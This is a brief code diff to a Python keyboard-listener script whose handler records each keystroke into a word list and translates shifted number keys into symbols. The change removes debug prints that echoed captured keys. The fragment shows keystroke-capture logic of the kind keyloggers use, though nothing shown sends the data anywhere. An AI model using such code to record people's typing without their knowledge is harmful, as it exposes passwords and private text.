@@ -12,9 +12,9 @@ def main():
 		listener.join()
 
 def on_press(key):
-	print(key)
 	global shift
 	key = str(key).strip("'")
+	
 	if key == "Key.space":
 		word.append(" ")
 
@@ -33,7 +33,6 @@ def on_press(key):
 
 	elif key in num:
 		if shift == True:
-			print(sym2[key])
 			word.append(sym2[key])
 			shift = False
 		else:
